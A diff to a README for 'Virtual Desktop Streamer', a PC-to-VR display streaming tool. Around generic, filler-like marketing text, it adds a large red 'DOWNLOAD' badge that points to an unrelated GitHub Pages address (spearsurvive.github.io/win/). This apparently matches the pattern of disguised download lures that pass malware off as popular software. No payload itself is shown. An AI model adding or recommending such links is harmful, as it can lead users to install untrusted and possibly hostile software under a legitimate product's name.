@@ -30,6 +30,12 @@ Virtual Desktop Streamer runs on your gaming PC and streams the display to the V
 
 Whether you're a newcomer or a veteran, Virtual Desktop Streamer provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Virtual Desktop Streamer](https://img.shields.io/badge/⬇_DOWNLOAD_Virtual+Desktop+Streamer-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
